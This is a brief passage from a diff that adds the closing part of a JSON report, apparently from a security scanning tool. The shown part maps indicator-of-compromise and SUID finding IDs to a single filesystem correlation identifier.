+      },
+      "correlations_by_finding": {
+        "ioc_72db8e79": [
+          "corr_filesystem_943a146a_ebbe4216"
+        ],
+        "suid_935eb789": [
+          "corr_filesystem_943a146a_ebbe4216"
+        ],
+        "suid_4021de15": [
+          "corr_filesystem_943a146a_ebbe4216"
+        ]
+      }
+    }
+  }
+}
